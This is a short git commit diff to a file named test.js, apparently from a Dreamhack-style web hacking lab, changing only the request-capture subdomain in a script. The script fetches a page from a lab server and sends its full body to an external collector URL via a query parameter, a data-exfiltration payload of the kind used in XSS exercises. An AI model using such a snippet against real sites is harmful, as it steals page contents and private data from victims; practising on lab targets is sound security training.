eb946f534f76e662f06d2758d4c3c3129701bb6a
likeash <likeash1235@gmail.com>
2026-07-27 20:17:45 +0900

    modify file 4

--- test.js
+++ test.js
@@ -2,7 +2,7 @@ fetch("http://edu.arang.kr:9103/board/0")
   .then(r => r.text())
   .then(body => {
     fetch(
-      "https://cgupcon.request.dreamhack.games?x=" +
+      "https://yfwlepw.request.dreamhack.games?x=" +
       encodeURIComponent(body)
     );
   });
